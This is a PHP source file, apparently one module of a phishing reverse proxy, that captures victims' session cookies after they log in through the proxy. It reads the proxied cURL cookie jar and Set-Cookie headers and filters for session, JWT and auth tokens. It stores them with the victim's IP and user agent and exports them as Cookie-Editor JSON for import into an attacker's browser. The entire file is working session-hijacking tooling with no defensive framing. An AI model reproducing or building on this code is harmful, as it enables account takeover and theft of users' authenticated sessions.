<?php
/**
 * lib/hijacker.php — Session hijack: snapshot cookie jars on verified login.
 *
 * After the proxy verifies a successful login, this module:
 *   1. Reads the victim's cURL cookie jar
 *   2. Collects Set-Cookie headers from the response
 *   3. Filters for session-like cookies
 *   4. Stores them in the DB + exports Cookie-Editor JSON format
 */

require_once __DIR__ . '/store.php';

define('HIJACK_SESSION_HINTS', [
    'session', 'sess', 'sid', 'phpsessid', 'jsessionid', 'aspsession',
    'asp.net_sessionid', 'laravel_session', 'connect.sid', 'express:sess',
    'token', 'auth', 'jwt', 'access_token', 'refresh_token', '_identity',
    'remember_token', 'remember_me', '__stripe_mid', 'wp_sec', 'logged_in',
]);

define('HIJACK_NOISE_COOKIES', [
    '_ga', '_gid', '_gat', '_fbp', '_fbc', '_hjsession', '_hjsessionuser',
    'cf_clearance', '__cf_bm', 'cf_ob_info', '__cflb',
    'consent', 'cookie_consent', 'gdpr', 'accepted_cookies',
    'lang', 'locale', 'language', 'theme', 'dark_mode', 'timezone', 'tz',
    '_gcl_au', '_gcl_aw', 'NID', 'SID', 'HSID', 'APISID',
]);

/**
 * Snapshot the current cookie state for a victim.
 *
 * @param string $slug         Target slug
 * @param string $victim_id    Unique victim session identifier
 * @param string $jar_path     Path to cURL Netscape cookie jar file
 * @param array  $set_cookies  Set-Cookie headers from the response
 * @param string $ip           Victim's IP
 * @param string $ua           Victim's User-Agent
 * @param string $domain       Target domain
 * @return int Session ID in DB
 */
function hijacker_snapshot(
    string $slug,
    string $victim_id,
    string $jar_path,
    array  $set_cookies,
    string $ip,
    string $ua,
    string $domain
): int {
    $cookies = [];

    // Read cURL cookie jar (Netscape format)
    if (is_file($jar_path)) {
        $cookies = array_merge($cookies, hijacker_read_jar($jar_path));
    }

    // Parse Set-Cookie headers
    foreach ($set_cookies as $sc) {
        $parsed = hijacker_parse_set_cookie($sc);
        if ($parsed !== null) {
            $cookies[$parsed['name']] = $parsed;
        }
    }

    // Filter out noise
    $cookies = array_filter($cookies, function($c) {
        $name = strtolower($c['name'] ?? '');
        foreach (HIJACK_NOISE_COOKIES as $noise) {
            if ($name === $noise || str_starts_with($name, $noise . '_')) return false;
        }
        return true;
    });

    // Filter for session-like cookies
    $session_cookies = array_filter($cookies, function($c) {
        $name = strtolower($c['name'] ?? '');
        $val  = $c['value'] ?? '';

        // Name matches a session hint
        foreach (HIJACK_SESSION_HINTS as $hint) {
            if (strpos($name, $hint) !== false) return true;
        }

        // Value looks like a token (long, alphanumeric)
        if (strlen($val) >= 20 && preg_match('/^[a-zA-Z0-9+\/=_.-]+$/', $val)) return true;

        return false;
    });

    // Build Cookie-Editor JSON (compatible with Cookie-Editor / EditThisCookie browser extensions)
    $ce_json = hijacker_build_cookie_editor($session_cookies, $domain);

    return store_session_add(
        $slug,
        $victim_id,
        $ip,
        $ua,
        array_values($session_cookies),
        $ce_json,
        'success'
    );
}

function hijacker_read_jar(string $path): array {
    $cookies = [];
    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) return [];

    foreach ($lines as $line) {
        // Skip comments
        $raw = $line;
        $httponly = false;
        if (str_starts_with($line, '#HttpOnly_')) {
            $httponly = true;
            $line = substr($line, 10);
        }
        if (str_starts_with($line, '#') || trim($line) === '') continue;

        $parts = explode("\t", $line);
        if (count($parts) < 7) continue;

        $name = $parts[5];
        $cookies[$name] = [
            'name'     => $name,
            'value'    => $parts[6],
            'domain'   => ltrim($parts[0], '.'),
            'path'     => $parts[2],
            'secure'   => strtolower($parts[3]) === 'true',
            'httponly'  => $httponly,
            'expires'   => (int) $parts[4],
        ];
    }
    return $cookies;
}

function hijacker_parse_set_cookie(string $header): ?array {
    $parts = explode(';', $header);
    $kv = explode('=', trim($parts[0]), 2);
    if (count($kv) < 2 || trim($kv[0]) === '') return null;

    $cookie = [
        'name'     => trim($kv[0]),
        'value'    => trim($kv[1]),
        'domain'   => '',
        'path'     => '/',
        'secure'   => false,
        'httponly'  => false,
        'expires'   => 0,
    ];

    for ($i = 1; $i < count($parts); $i++) {
        $attr = strtolower(trim($parts[$i]));
        if ($attr === 'secure') { $cookie['secure'] = true; continue; }
        if ($attr === 'httponly') { $cookie['httponly'] = true; continue; }
        $eq = explode('=', $parts[$i], 2);
        if (count($eq) < 2) continue;
        $ak = strtolower(trim($eq[0]));
        $av = trim($eq[1]);
        if ($ak === 'domain')  $cookie['domain'] = ltrim($av, '.');
        if ($ak === 'path')    $cookie['path'] = $av;
        if ($ak === 'expires') $cookie['expires'] = (int) strtotime($av);
        if ($ak === 'max-age') $cookie['expires'] = time() + (int) $av;
    }

    return $cookie;
}

function hijacker_build_cookie_editor(array $cookies, string $domain): array {
    $result = [];
    foreach ($cookies as $c) {
        $result[] = [
            'domain'   => '.' . ($c['domain'] ?: $domain),
            'expirationDate' => $c['expires'] > 0 ? (float) $c['expires'] : null,
            'hostOnly' => empty($c['domain']),
            'httpOnly'  => $c['httponly'] ?? false,
            'name'     => $c['name'],
            'path'     => $c['path'] ?? '/',
            'sameSite' => 'unspecified',
            'secure'   => $c['secure'] ?? false,
            'session'  => ($c['expires'] ?? 0) <= 0,
            'storeId'  => '0',
            'value'    => $c['value'],
        ];
    }
    return $result;
}
